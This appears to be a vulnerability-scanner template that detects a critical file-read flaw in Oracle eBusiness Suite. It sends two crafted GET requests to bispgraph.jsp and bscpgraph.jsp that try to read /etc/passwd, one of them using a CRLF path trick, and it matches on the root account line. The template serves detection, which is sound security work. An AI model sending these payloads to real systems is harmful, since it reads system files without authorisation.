id: oracle-ebs-bispgrapgh-file-read
name: Oracle eBusiness Suite - Improper File Access
severity: critical
confidence: tentative
description: Oracle eBusiness Suite is susceptible to improper file access vulnerabilities via bispgrapgh. Be aware this product
  is no longer supported with patches or security fixes.
reference: https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite-wp-4.pdf
tags:
- oracle
- lfi
- vuln
requests:
- method: GET
  path: /OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/
  matchers: &id001
  - type: regex
    regex:
    - 'root:.*:0:0:'
  condition: or
- method: GET
  path: /OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd
  matchers: *id001
  condition: or
